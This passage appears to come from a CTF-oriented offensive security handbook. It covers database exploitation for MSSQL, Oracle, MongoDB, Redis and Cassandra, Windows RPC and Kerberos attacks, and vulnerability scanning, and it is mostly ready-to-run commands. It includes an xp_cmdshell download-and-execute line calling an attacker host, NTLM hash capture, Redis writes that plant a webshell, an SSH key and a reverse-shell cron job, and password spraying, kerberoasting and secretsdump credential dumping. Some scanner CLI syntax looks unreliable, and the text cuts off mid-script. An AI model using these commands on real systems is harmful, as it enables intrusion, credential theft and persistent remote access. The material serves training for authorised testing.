SELECT name, type_desc FROM sys.server_principals;
SELECT name FROM sys.sql_logins;
SELECT name, is_disabled FROM sys.sql_logins;
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'DATABASE');
EXEC sp_helpsrvrolemember 'sysadmin';
```

**Linked server enumeration:**

```sql
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
SELECT srvname, isremote FROM sysservers;
```

**Executing queries on linked servers:**

```sql
SELECT * FROM OPENQUERY("linked_server", 'SELECT @@version');
EXEC ('SELECT @@version') AT linked_server;
```

**Reading files (requires appropriate permissions):**

```sql
CREATE TABLE temp (data varchar(8000));
BULK INSERT temp FROM 'C:\Windows\System32\drivers\etc\hosts';
SELECT * FROM temp;
DROP TABLE temp;
```

**Command execution via xp_cmdshell:**

Enabling xp_cmdshell (requires sysadmin role):

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Executing commands:

```sql
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'dir C:\';
EXEC master..xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker/shell.ps1")';
```

**Checking if xp_cmdshell is enabled:**

```sql
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

**NTLM hash capture:**

```sql
EXEC master..xp_dirtree '\\attacker_ip\share';
EXEC master..xp_fileexist '\\attacker_ip\share\file';
```

Use Responder to capture hashes:

```bash
responder -I eth0
```

**Impersonation attacks:**

Checking for impersonation privileges:

```sql
SELECT distinct b.name FROM sys.server_permissions a 
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE';
```

Impersonating users:

```sql
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

**Metasploit modules:**

```bash
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_enum_sql_logins
use auxiliary/admin/mssql/mssql_exec
use auxiliary/admin/mssql/mssql_sql
use exploit/windows/mssql/mssql_payload
```

### Oracle (Port 1521)

**Port scanning:**

```bash
nmap -p 1521 <target>
nmap -p 1521 -sV <target>
nmap -p 1521,1522-1529 <target>
```

**Oracle NSE scripts:**

```bash
nmap -p 1521 --script oracle-sid-brute <target>
nmap -p 1521 --script oracle-enum-users --script-args sid=ORCL <target>
nmap -p 1521 --script oracle-brute --script-args sid=ORCL <target>
```

**SID enumeration with odat:**

```bash
odat sidguesser -s <target>
odat sidguesser -s <target> -p 1521
```

**SID enumeration with tnscmd10g:**

```bash
tnscmd10g version -h <target>
tnscmd10g status -h <target>
```

**Connecting with sqlplus:**

```bash
sqlplus username/password@<target>:1521/SID
sqlplus username/password@<target>/ORCL
sqlplus sys/password@<target>:1521/ORCL as sysdba
sqlplus / as sysdba  # Local connection
```

**Common default credentials:**

- Username: `sys`, Password: `sys` or `change_on_install` (as sysdba)
- Username: `system`, Password: `manager` or `oracle`
- Username: `scott`, Password: `tiger`
- Username: `dbsnmp`, Password: `dbsnmp`

**Basic enumeration commands:**

```sql
SELECT * FROM v$version;
SELECT user FROM dual;
SELECT name FROM v$database;
SELECT username FROM all_users;
SELECT username FROM dba_users;
SELECT * FROM session_privs;
SELECT * FROM user_role_privs;
```

**Table enumeration:**

```sql
SELECT table_name FROM all_tables;
SELECT table_name FROM user_tables;
SELECT owner, table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
```

**Privilege enumeration:**

```sql
SELECT * FROM session_privs;
SELECT * FROM user_sys_privs;
SELECT * FROM user_tab_privs;
SELECT grantee, privilege FROM dba_sys_privs WHERE grantee='USERNAME';
```

**Reading files (requires Java permissions):**

```sql
SELECT UTL_FILE.GET_LINE('/etc/passwd') FROM dual;
```

**Command execution (requires Java permissions):**

```sql
SELECT DBMS_JAVA.RUNJAVA('os_command') FROM dual;
```

**ODAT (Oracle Database Attacking Tool) usage:**

All modules:

```bash
odat all -s <target> -U username -P password -d SID
```

Specific modules:

```bash
odat sidguesser -s <target>
odat passwordguesser -s <target> -d SID
odat utlfile -s <target> -U username -P password -d SID --getFile /etc/passwd
odat externaltable -s <target> -U username -P password -d SID --exec "whoami"
odat dbmsadvisor -s <target> -U username -P password -d SID --putFile /tmp/ shell.sh /local/shell.sh
```

**Metasploit modules:**

```bash
use auxiliary/scanner/oracle/oracle_login
use auxiliary/scanner/oracle/sid_enum
use auxiliary/admin/oracle/oracle_sql
use auxiliary/admin/oracle/sid_brute
```

### MongoDB (Port 27017)

**Port scanning:**

```bash
nmap -p 27017 <target>
nmap -p 27017 -sV -sC <target>
nmap -p 27017,27018,27019,28017 <target>
```

**MongoDB NSE scripts:**

```bash
nmap -p 27017 --script mongodb-info <target>
nmap -p 27017 --script mongodb-databases <target>
nmap -p 27017 --script mongodb-brute <target>
```

**Connecting with mongo client:**

```bash
mongo <target>
mongo <target>:27017
mongo <target>:27017/database_name
mongo "mongodb://username:password@<target>:27017/database"
mongo --host <target> --port 27017 -u username -p password
```

**Testing for authentication:**

```bash
mongo <target>:27017 --eval "db.version()"
```

**Basic enumeration commands:**

```javascript
version()
db.version()
db.serverStatus()
db.stats()
show dbs
show databases
use database_name
show collections
show tables
db.collection_name.find()
db.collection_name.find().pretty()
```

**User enumeration:**

```javascript
use admin
db.system.users.find()
db.getUsers()
db.runCommand({usersInfo: 1})
show users
```

**Extracting data:**

```javascript
use database_name
db.getCollectionNames()
db.collection_name.find().pretty()
db.collection_name.find({field: "value"})
db.users.find()
db.users.find({username: "admin"})
```

**Counting documents:**

```javascript
db.collection_name.count()
db.collection_name.countDocuments()
```

**Creating users (if admin access):**

```javascript
use admin
db.createUser({user: "username", pwd: "password", roles: ["root"]})
```

**Command execution (if authorized):**

```javascript
db.runCommand({eval: "function(){return 'command'}"})
```

[Inference] Older MongoDB versions (< 4.2) may allow arbitrary JavaScript execution through the eval command if not properly restricted, potentially leading to command execution.

**Checking authentication configuration:**

```javascript
db.adminCommand({getCmdLineOpts: 1})
```

**NoSQL injection testing:**

Authentication bypass attempts in application contexts:

```javascript
{username: {$ne: null}, password: {$ne: null}}
{username: {$gt: ""}, password: {$gt: ""}}
{username: admin, password: {$regex: ".*"}}
```

**Metasploit modules:**

```bash
use auxiliary/scanner/mongodb/mongodb_login
use auxiliary/gather/mongodb_js_inject_collection_enum
```

### Redis (Port 6379)

**Port scanning:**

```bash
nmap -p 6379 <target>
nmap -p 6379 -sV <target>
```

**Redis NSE scripts:**

```bash
nmap -p 6379 --script redis-info <target>
nmap -p 6379 --script redis-brute <target>
```

**Connecting with redis-cli:**

```bash
redis-cli -h <target>
redis-cli -h <target> -p 6379
redis-cli -h <target> -a password
redis-cli -h <target> --pass password
```

**Testing for authentication:**

```bash
redis-cli -h <target> ping
```

Response:

- `PONG`: No authentication required
- `NOAUTH Authentication required`: Authentication needed

**Basic enumeration commands:**

```bash
INFO
INFO server
INFO replication
CONFIG GET *
CLIENT LIST
DBSIZE
```

**Key enumeration:**

```bash
KEYS *
SCAN 0
GET key_name
TYPE key_name
```

**Database operations:**

```bash
SELECT 0
SELECT 1
FLUSHALL  # Clear all databases (destructive)
```

**Authentication:**

```bash
AUTH password
```

**File writing (requires appropriate permissions):**

Writing SSH key:

```bash
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET crackit "SSH_PUBLIC_KEY"
SAVE
```

Writing webshell:

```bash
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET webshell "<?php system($_GET['cmd']); ?>"
SAVE
```

Writing cron job:

```bash
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET cron "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker_ip/port 0>&1\n\n"
SAVE
```

[Inference] File writing techniques require Redis to have write permissions to the target directory and may fail if Redis is running with restricted privileges or if SELinux/AppArmor policies prevent such operations.

**Checking configuration:**

```bash
CONFIG GET dir
CONFIG GET dbfilename
CONFIG GET requirepass
```

**Module exploitation (Redis >= 4.x):**

[Unverified] Redis modules can be loaded to execute arbitrary code, with tools like redis-rogue-server automating this process, though success depends on Redis version and configuration.

**Metasploit modules:**

```bash
use auxiliary/scanner/redis/redis_server
use auxiliary/scanner/redis/file_upload
use exploit/linux/redis/redis_replication_cmd_exec
```

### Cassandra (Port 9042)

**Port scanning:**

```bash
nmap -p 9042 <target>
nmap -p 9042,7000,7001,9160 <target>
nmap -p 9042 -sV <target>
```

Port breakdown:

- 9042: CQL native transport port
- 7000: Inter-node communication
- 7001: TLS inter-node communication
- 9160: Thrift client API (legacy)

**Connecting with cqlsh:**

```bash
cqlsh <target>
cqlsh <target> 9042
cqlsh <target> -u username -p password
cqlsh <target> --username=username --password=password
```

**Common default credentials:**

- Username: `cassandra`, Password: `cassandra`

**Basic enumeration commands:**

```sql
DESCRIBE CLUSTER;
DESCRIBE KEYSPACES;
USE keyspace_name;
DESCRIBE TABLES;
DESCRIBE TABLE table_name;
SELECT * FROM table_name;
SELECT * FROM system_schema.keyspaces;
SELECT * FROM system_schema.tables;
```

**User enumeration:**

```sql
SELECT * FROM system_auth.roles;
LIST USERS;
LIST ROLES;
```

**Checking permissions:**

```sql
LIST ALL PERMISSIONS;
LIST ALL PERMISSIONS OF username;
```

**Data extraction:**

```sql
USE keyspace_name;
SELECT * FROM table_name LIMIT 100;
SELECT column1, column2 FROM table_name WHERE condition;
```

**Version information:**

```sql
SELECT release_version FROM system.local;
SHOW VERSION;
```

**Creating users (if authorized):**

```sql
CREATE ROLE username WITH PASSWORD = 'password' AND LOGIN = true;
CREATE ROLE username WITH PASSWORD = 'password' AND SUPERUSER = true AND LOGIN = true;
```

**Nmap scripting:**

```bash
nmap -p 9042 --script cassandra-info <target>
nmap -p 9042 --script cassandra-brute <target>
```

**NoSQL injection considerations:**

[Inference] CQL injection is possible in applications that concatenate user input into CQL queries, similar to SQL injection, though parameterized queries largely prevent this.

**Important related topics for CTF scenarios:**

- Password hash extraction and cracking for discovered database users
- Post-exploitation data exfiltration techniques
- Database-specific privilege escalation paths
- Exploiting stored procedures and functions
- Database pivoting and lateral movement

---

## RPC & Remote Service Enumeration

### rpcinfo

**rpcinfo** queries RPC (Remote Procedure Call) services to identify available endpoints, versions, and protocols. It provides foundational reconnaissance for remote service exploitation.

List all RPC services on a target:

```bash
rpcinfo -p 192.168.1.100
```

Output displays program number, version, protocol (TCP/UDP), port, and service name. This reveals all exposed RPC endpoints. [Inference] Exposed RPC services indicate potential attack surface, particularly if non-standard programs are registered.

Query specific RPC program:

```bash
rpcinfo -p 192.168.1.100 | grep portmapper
```

The portmapper program (program number 100000) manages RPC service registration. Filter by specific protocol:

```bash
rpcinfo -p 192.168.1.100 | grep tcp
rpcinfo -p 192.168.1.100 | grep udp
```

TCP RPC typically indicates file services or directory services; UDP RPC suggests older services.

Test connectivity to specific RPC program:

```bash
rpcinfo -u 192.168.1.100 100003 3
```

Parameters: `-u` specifies UDP, host, program number (100003 is NFS), and version (3). Successful output confirms the service is accessible. Test over TCP:

```bash
rpcinfo -t 192.168.1.100 100003 3
```

The `-t` flag specifies TCP. Discover RPC program versions:

```bash
rpcinfo -p 192.168.1.100 | grep -E "100003|100005"
```

Program 100003 is NFS, 100005 is mount protocol. Multiple versions indicate service compatibility. Older versions may contain known vulnerabilities.

Enumerate all RPC services with details:

```bash
rpcinfo -p 192.168.1.100 > rpc_services.txt
cat rpc_services.txt
```

Save output for offline analysis and comparison with known vulnerable versions.

Common RPC program numbers to identify:

- 100000: portmapper
- 100003: NFS (Network File System)
- 100005: mount protocol
- 100007: ypbind (NIS binding)
- 100009: ypserv (NIS server)
- 100021: nlockmgr (NFS lock manager)
- 100024: status
- 100027: nfs_acl

### rpcclient

**rpcclient** performs authenticated and unauthenticated RPC queries against Windows systems, primarily for Active Directory and SMB enumeration. It connects to RPC endpoints and executes remote procedures.

Basic unauthenticated connection:

```bash
rpcclient -U "" -N 192.168.1.100
```

Parameters: `-U ""` specifies empty username (anonymous), `-N` disables password prompting. The connection establishes without credentials. [Inference] Successful unauthenticated connections indicate null session access, a significant information disclosure vulnerability.

Interactive mode allows sequential commands:

```bash
rpcclient -U "" -N 192.168.1.100
> help
> enumdomains
> quit
```

The `help` command lists available procedures. `enumdomains` returns all domains known to the target.

Enumerate domain information:

```bash
rpcclient -U "" -N 192.168.1.100 -c "enumdomains"
```

The `-c` parameter executes commands non-interactively. Returns domain names and security identifiers (SIDs).

Query domain security identifier:

```bash
rpcclient -U "" -N 192.168.1.100 -c "querydominfo"
```

Outputs domain properties including user count, group count, and forest information.

Enumerate users:

```bash
rpcclient -U "" -N 192.168.1.100 -c "enumdomusers"
```

Lists all users in the domain with their RIDs (Relative Identifiers). Extract usernames:

```bash
rpcclient -U "" -N 192.168.1.100 -c "enumdomusers" | awk '{print $1}'
```

Query user information by RID:

```bash
rpcclient -U "" -N 192.168.1.100 -c "queryuser 0x3e8"
```

RID 0x3e8 (1000 in decimal) is the first user-created account in Active Directory. Subsequent RIDs increment sequentially. User details include account flags indicating password policy, account status, and access control properties.

Enumerate groups:

```bash
rpcclient -U "" -N 192.168.1.100 -c "enumdomgroups"
```

Lists all groups and their RIDs. Query group membership:

```bash
rpcclient -U "" -N 192.168.1.100 -c "querygroupmem 0x200"
```

RID 0x200 (512 in decimal) is the Domain Admins group. The output lists member RIDs.

Convert RID to username:

```bash
rpcclient -U "" -N 192.168.1.100 -c "queryuser 0x3e8" | grep "User Name"
```

Query group by name:

```bash
rpcclient -U "" -N 192.168.1.100 -c "querygroupmem 0x200" | while read rid; do rpcclient -U "" -N 192.168.1.100 -c "queryuser $rid" | grep "User Name"; done
```

This maps Domain Admins membership to actual usernames.

Enumerate local groups on a machine (requires different pipe):

```bash
rpcclient -U "" -N 192.168.1.100 -c "getusername" -l SAMR
```

Query password policy:

```bash
rpcclient -U "" -N 192.168.1.100 -c "getdompwinfo"
```

Returns password minimum length, password history, lockout duration, and expiration settings. This informs password cracking strategy.

Test with authentication credentials:

```bash
rpcclient -U "DOMAIN\username" 192.168.1.100
```

Prompts for password. Authenticated sessions access additional procedures and information. Perform share enumeration (SMB-related):

```bash
rpcclient -U "" -N 192.168.1.100 -c "netshareenumall"
```

Lists all shares on the target system with share paths and types.

Query share details:

```bash
rpcclient -U "" -N 192.168.1.100 -c "netsharegetinfo C$"
```

The C$ share is the root filesystem (typically admin-only). Successful query indicates elevated access.

### impacket tools

**impacket** is a Python library providing low-level protocol implementations. Multiple tools facilitate RPC, Kerberos, and SMB enumeration.

**GetADUsers.py** enumerates Active Directory users:

```bash
python GetADUsers.py -all -dc-ip 192.168.1.100 DOMAIN/username:password
```

Parameters: `-all` retrieves all users (default filters active users), `-dc-ip` specifies domain controller, followed by credentials in DOMAIN/username:password format. Output includes username, last logon, and account status.

Anonymous enumeration (if supported):

```bash
python GetADUsers.py -all -dc-ip 192.168.1.100 DOMAIN/
```

Omitting credentials attempts null session access. Extract usernames only:

```bash
python GetADUsers.py -all -dc-ip 192.168.1.100 DOMAIN/ | awk '{print $1}'
```

**GetNPUsers.py** discovers users vulnerable to AS-REP roasting (Kerberos pre-authentication bypass):

```bash
python GetNPUsers.py -dc-ip 192.168.1.100 -no-pass DOMAIN/
```

The `-no-pass` flag attempts authentication without password, exploiting disabled pre-authentication. Returns TGT (Ticket Granting Ticket) hashes for offline cracking.

Output format includes username and hash. Extract hashes for cracking:

```bash
python GetNPUsers.py -dc-ip 192.168.1.100 -no-pass DOMAIN/ -format john > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Test against specific user list:

```bash
python GetNPUsers.py -dc-ip 192.168.1.100 -no-pass -usersfile usernames.txt DOMAIN/
```

**GetUserSPNs.py** enumerates service principal names (SPNs), revealing services running under user accounts (kerberoasting targets):

```bash
python GetUserSPNs.py -dc-ip 192.168.1.100 DOMAIN/username:password
```

Output includes service type, host, and port. Services like MSSQL, HTTP, and CIFS running under user accounts are kerberoasting candidates.

Request TGS (Ticket Granting Service) tickets for offline cracking:

```bash
python GetUserSPNs.py -dc-ip 192.168.1.100 -request DOMAIN/username:password
```

The `-request` flag retrieves TGS tickets in crackable format. Extract hashes:

```bash
python GetUserSPNs.py -dc-ip 192.168.1.100 -request DOMAIN/username:password -outputfile spn_hashes.txt
hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt
```

**secretsdump.py** extracts credentials and secrets from targets (requires administrative access or local execution):

```bash
python secretsdump.py -dc-ip 192.168.1.100 DOMAIN/username:password@192.168.1.100
```

Extracts NTLM hashes, plaintext passwords (if stored), Kerberos keys, and cached credentials. Output format: `USERNAME:UID:LM_HASH:NTLM_HASH:::`. [Inference] Administrative access to domain controllers enables extraction of all domain user credentials.

Extract secrets from local system (requires local admin):

```bash
python secretsdump.py -sam sam_file -security security_file -system system_file LOCAL
```

Requires SAM, SECURITY, and SYSTEM registry hives (typically from /Windows/System32/config/).

**samrdump.py** enumerates user and group information via SAM remote protocol:

```bash
python samrdump.py -dc-ip 192.168.1.100 DOMAIN/username:password@192.168.1.100
```

Similar to rpcclient enumeration but with Python integration. Output includes users, groups, and account policies.

**lookupsid.py** performs SID-to-name resolution and brute-force enumeration:

```bash
python lookupsid.py -dc-ip 192.168.1.100 DOMAIN/username:password@192.168.1.100
```

Enumerates all SIDs in the domain and maps them to usernames and group names. Brute-force SID enumeration:

```bash
python lookupsid.py DOMAIN/username:password@192.168.1.100 0
```

The trailing `0` initiates brute-force enumeration starting from RID 0. This discovers all domain principals.

**wmiexec.py** executes commands via WMI (Windows Management Instrumentation):

```bash
python wmiexec.py -dc-ip 192.168.1.100 DOMAIN/username:password@192.168.1.100
```

Establishes semi-interactive shell on target. [Unverified] WMI execution may be logged differently than traditional remote execution, potentially creating forensic artifacts.

**dcomexec.py** executes commands via DCOM (Distributed Component Object Model):

```bash
python dcomexec.py -dc-ip 192.168.1.100 DOMAIN/username:password@192.168.1.100
```

Similar to wmiexec but uses DCOM protocol. Some systems may have WMI restricted but DCOM enabled.

**smbexec.py** executes commands via SMB (Server Message Block):

```bash
python smbexec.py -dc-ip 192.168.1.100 DOMAIN/username:password@192.168.1.100
```

Uploads temporary executable and executes via Service Control Manager. More reliable than WMI/DCOM on older systems.

**psexec.py** implements PsExec functionality in pure Python:

```bash
python psexec.py -dc-ip 192.168.1.100 DOMAIN/username:password@192.168.1.100
```

Executes commands as SYSTEM. Requires administrative credentials.

### Kerberos Enumeration (kerbrute, GetNPUsers.py)

**kerbrute** performs Kerberos username enumeration and password spraying against domain controllers. It validates usernames through Kerberos pre-authentication responses.

Basic username enumeration:

```bash
kerbrute userenum -d DOMAIN.COM --dc 192.168.1.100 usernames.txt
```

Parameters: `-d` specifies domain, `--dc` specifies domain controller, followed by wordlist file. Returns valid usernames based on Kerberos responses. [Inference] Kerberos enumeration avoids credential lockout compared to LDAP enumeration on some configurations.

Enumerate against multiple domain controllers:

```bash
kerbrute userenum -d DOMAIN.COM --dc 192.168.1.100 --dc 192.168.1.101 usernames.txt
```

Load balancing across multiple DCs speeds enumeration. Output indicates valid and invalid users.

Password spraying (test one password against many users):

```bash
kerbrute passwordspray -d DOMAIN.COM --dc 192.168.1.100 usernames.txt 'Password123!'
```

Tests the specified password against all users in the list. Avoid triggering lockout policies by using delays:

```bash
kerbrute passwordspray -d DOMAIN.COM --dc 192.168.1.100 --delay 5000 usernames.txt 'Password123!'
```

The `--delay` parameter specifies milliseconds between attempts. Brute-force specific user:

```bash
kerbrute bruteuser -d DOMAIN.COM --dc 192.168.1.100 passwords.txt username
```

Attempts all passwords in wordlist against single user. Combine with delay to avoid lockout:

```bash
kerbrute bruteuser -d DOMAIN.COM --dc 192.168.1.100 --delay 1000 passwords.txt username
```

Verbose output shows pre-authentication failures vs. successes:

```bash
kerbrute userenum -d DOMAIN.COM --dc 192.168.1.100 -v usernames.txt
```

The `-v` flag displays detailed responses for each attempt.

Output valid credentials to file:

```bash
kerbrute userenum -d DOMAIN.COM --dc 192.168.1.100 usernames.txt -o valid_users.txt
```

Test for users with pre-authentication disabled (AS-REP roasting targets):

```bash
kerbrute userenum -d DOMAIN.COM --dc 192.168.1.100 --no-preauth usernames.txt
```

Users returning AS-REP responses without requiring Kerberos pre-authentication are vulnerable to offline TGT cracking.

**GetNPUsers.py** (revisited for Kerberos focus) enumerates AS-REP roastable accounts:

```bash
python GetNPUsers.py -dc-ip 192.168.1.100 -format hashcat -no-pass DOMAIN/ > as_rep_hashes.txt
```

Returns Kerberos 5 AS-REP hashes compatible with hashcat (mode 18200). Crack hashes:

```bash
hashcat -m 18200 as_rep_hashes.txt /usr/share/wordlists/rockyou.txt
```

Extract specific user:

```bash
python GetNPUsers.py -dc-ip 192.168.1.100 -usersfile usernames.txt -format john -no-pass DOMAIN/ > hashes_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes_john.txt
```

Test against domain of specific user:

```bash
python GetNPUsers.py -dc-ip 192.168.1.100 -no-pass DOMAIN.COM/username
```

If username exists, the tool attempts to retrieve AS-REP hash even without password.

Enumerate Kerberos service tickets for kerberoasting. Standard approach via GetUserSPNs.py:

```bash
python GetUserSPNs.py -dc-ip 192.168.1.100 DOMAIN/username:password -request -format hashcat -outputfile spn_hashes.txt
hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt
```

Kerberos TGS cracking targets services running under user accounts (not computer/system accounts).

Identify accounts with delegation enabled (unconstrained delegation allows privilege escalation):

```bash
python GetADUsers.py -dc-ip 192.168.1.100 DOMAIN/username:password -all | grep -i "delegation"
```

[Inference] Accounts with unconstrained delegation can request TGTs for any service, enabling lateral movement.

Enumerate constrained delegation rights:

```bash
python GetUserSPNs.py -dc-ip 192.168.1.100 DOMAIN/username:password | grep -i "trusted for delegation"
```

Constrained delegation limits the services an account can impersonate, reducing blast radius compared to unconstrained delegation.

Extract domain functional level (indicates available Kerberos features):

```bash
python GetADUsers.py -dc-ip 192.168.1.100 DOMAIN/username:password | head -5
```

[Unverified] Domain functional level determines Kerberos protocol version support; older levels may support deprecated algorithms.

Enumerate Kerberos policy (password age, minimum length, history):

```bash
kerbrute userenum -d DOMAIN.COM --dc 192.168.1.100 --info usernames.txt 2>&1 | grep -i "policy"
```

[Inference] Policy extraction via Kerberos may provide less detail than LDAP queries due to protocol limitations.

Test for Kerberos pre-authentication enforcement:

```bash
kerbrute userenum -d DOMAIN.COM --dc 192.168.1.100 usernames.txt 2>&1 | grep -i "preauth"
```

Users with pre-authentication disabled return different error codes, identifiable through verbose output.

Related topics for expanded coverage: Kerberos delegation attacks (unconstrained/constrained), golden ticket creation, silver ticket exploitation, and relay attacks targeting Kerberos services.

---

# VULNERABILITY DETECTION & ASSESSMENT

## Active Vulnerability Scanning

### Nessus Integration

Nessus is a comprehensive vulnerability scanner offering network-wide assessment, plugin-based vulnerability detection, and compliance auditing. Available in Essentials (free, 16 IP limit) and Professional/Manager editions.

**Nessus fundamentals:**

Nessus operates via web UI (typically https://localhost:8834) or command-line (`nessuscli`). Scans execute vulnerability checks against target systems using thousands of plugins (vulnerability signatures).

**Installation and initialization:**

```bash
# Install Nessus (Debian/Ubuntu)
sudo apt-get install nessus

# Start Nessus service
sudo systemctl start nessusd

# Verify service running
sudo systemctl status nessusd

# Access web UI
# Navigate to https://localhost:8834 in browser
```

**Command-line scan initiation:**

```bash
nessuscli -username admin -password password scan add -name "CTF_Scan" \
  -template "Basic Network Scan" -targets "192.168.1.0/24"
```

Parameters:

- `-username` / `-password` — Authentication credentials
- `scan add` — Create new scan
- `-name` — Scan identifier
- `-template` — Predefined scan configuration template
- `-targets` — CIDR notation target specification

**Available scan templates:**

```bash
nessuscli -username admin -password password list-templates
```

Common templates:

- `Basic Network Scan` — General vulnerability assessment
- `Credentialed Patch Audit` — OS patch compliance checking
- `Web Application Tests` — HTTP/HTTPS vulnerability detection
- `Malware Scan` — Malicious artifact detection
- `PCI DSS Compliance` — Payment Card Industry compliance audit

**Launch scan from CLI:**

```bash
nessuscli -username admin -password password scan launch -name "CTF_Scan"
```

**Monitor scan progress:**

```bash
nessuscli -username admin -password password scan list
nessuscli -username admin -password password scan details -name "CTF_Scan"
```

**Export scan results:**

```bash
nessuscli -username admin -password password scan export -name "CTF_Scan" \
  -format nessus > scan_results.nessus

nessuscli -username admin -password password scan export -name "CTF_Scan" \
  -format pdf > scan_results.pdf
```

Export formats: `nessus` (XML), `pdf`, `html`, `csv`

**Plugin management:**

Nessus plugins (vulnerability signatures) require updates for new vulnerability coverage.

```bash
# Update plugins manually
nessuscli -username admin -password password plugins update
```

**Credential configuration for deeper scanning:**

Credentialed scans provide OS-level access, enabling more thorough vulnerability detection. Configure via web UI or CLI:

```bash
nessuscli -username admin -password password add-credentials \
  -hostname 192.168.1.100 \
  -ssh-username root \
  -ssh-password password123
```

**Policy creation for custom scans:**

```bash
nessuscli -username admin -password password policy add \
  -name "CTF_Policy" \
  -settings "checks_read_timeout : 5;max_checks : 5"
```

[Unverified] Custom policy tuning requires understanding Nessus configuration syntax; documentation varies across versions.

**Nessus output parsing:**

```bash
# Extract vulnerabilities with CVSS >= 7.0
grep -A 5 "Severity.*High\|Severity.*Critical" scan_results.nessus

# Count vulnerabilities by severity
grep "severity" scan_results.nessus | sort | uniq -c

# Extract CVSS scores
grep "cvss_base_score" scan_results.nessus | grep -oP '(?<=>)[0-9.]+' | sort -rn
```

**Context-specific applications:**

- **Comprehensive scan baseline:** Establishes initial vulnerability profile before targeted exploitation
- **Compliance verification:** Checks patch status, weak configurations, compliance violations
- **False positive baseline:** Identifies common false positives for filtering in targeted scans
- **Priority identification:** CVSS scores and plugin confidence ratings prioritize exploitation efforts

**Example CTF scenario:**

```bash
# Full network reconnaissance
sudo nessuscli -username admin -password admin scan add -name "CTF_Network" \
  -template "Basic Network Scan" -targets "192.168.1.0/24"
nessuscli -username admin -password admin scan launch -name "CTF_Network"

# Monitor completion
while true; do
  nessuscli -username admin -password admin scan list | grep "CTF_Network"
  sleep 30
done

# Export and analyze results
nessuscli -username admin -password admin scan export -name "CTF_Network" \
  -format csv > vulnerabilities.csv
grep "High\|Critical" vulnerabilities.csv
```

---

### OpenVAS

OpenVAS (Open Vulnerability Assessment System) is open-source vulnerability scanner with comprehensive plugin library, available in Kali Linux by default.

**Installation and startup:**

```bash
# Install OpenVAS
sudo apt-get install openvas

# Start OpenVAS components
sudo gvm-setup

# Verify services running
sudo ps aux | grep -E "openvasmd|openvassd|redis"

# Access web UI
# Navigate to https://localhost:9392 (default credentials displayed during setup)
```

**Command-line scanning:**

```bash
# Create target
gvm-cli --username admin --password password socket \
  --xml '<create_target><name>CTF_Target</name><hosts>192.168.1.100</hosts></create_target>'

# List available scan configurations
gvm-cli --username admin --password password socket \
  --xml '<get_configs/>'

# Create task (scan job)
gvm-cli --username admin --password password socket \
  --xml '<create_task><name>CTF_Task</name><target id="TARGET_ID"></target><config id="CONFIG_ID"></config></create_task>'

# Start task
gvm-cli --username admin --password password socket \
  --xml '<start_task task_id="TASK_ID"/>'

# Get task details (progress)
gvm-cli --username admin --password password socket \
  --xml '<get_tasks task_id="TASK_ID"/>'
```

**Scan configuration types:**

Available configurations revealed by `get_configs`:

- `Full and fast` — Default configuration, rapid vulnerability checks
- `Full and very deep` — Comprehensive but slow; requires credentials
- `Compliance` — Compliance-focused checks (PCI-DSS, CIS benchmarks)
- `Discovery` — Port enumeration and service discovery only
- `System Discovery` — OS and service fingerprinting

**OpenVAS plugin updates:**

```bash
# Manually update vulnerability definitions (NVTs)
sudo greenbone-nvt-sync

# Update CERT and SCAP data
sudo greenbone-certdata-sync
sudo greenbone-scapdata-sync
```

[Unverified] Update synchronization via Greenbone Community Feed or commercial feeds; community feed frequency and coverage varies.

**Credential management:**

```bash
# Create SSH credential
gvm-cli --username admin --password password socket \
  --xml '<create_credential><name>SSH_Credential</name><login>root</login><password>password123</password><allow_insecure>1</allow_insecure></create_credential>'

# Link credential to target
gvm-cli --username admin --password password socket \
  --xml '<modify_target target_id="TARGET_ID"><ssh_credential id="CREDENTIAL_ID"/></modify_target>'
```

**Export scan results:**

```bash
# Get task report
gvm-cli --username admin --password password socket \
  --xml '<get_reports task_id="TASK_ID"/>'

# Export report in different formats
gvm-cli --username admin --password password socket \
  --xml '<get_reports report_id="REPORT_ID" details="1" format_id="FORMAT_ID"/>' > report.xml
```

Report formats (FORMAT_ID):

- `5e51645d-4b70-4da7-a256-390f7ba055a8` — PDF
- `50c332e4-f2c3-45ef-8eef-e24be3fbab59` — XML
- `6b2db524-9fb0-45ec-8f56-d8a54e21f622` — CSV
- `d5da9c6a-4ff1-4cf1-91d3-0015be119bdf` — PDF (alternative)

**Batch scanning workflow:**

```bash
#!/bin/bash
TARGET_LIST="192.168.1.100 192.168.1.101 192.168.1.102"
CONFIG_ID="08b69003-5fc2-45df-1f4d-7651e1dbecd7"  # Full and fast config

for target in $TARGET_LIST; do
  echo "[*] Creating target for $target"
  TARGET_ID=$(gvm-cli --username admin --password password socket \
    --xml "<create_target><name>Target_$target</name><hosts>$target</hosts></create_target>" \
    | grep -oP 'id="\K[^"]+' | head -1)
  
  echo "[*] Creating task for $target"
  TASK_ID=$(gvm-cli --username admin --password password socket \
    --xml "<create_task><name>Task_$target</name><target id=\"$TARGET_ID\"></target><config id=\"$CONFIG_ID\"></config></create_task>" \
    | grep -oP 'id="\K[^"]+' | head -1)
  
  echo "[*] Launching task"
  gvm-cli --username admin --password password socket \
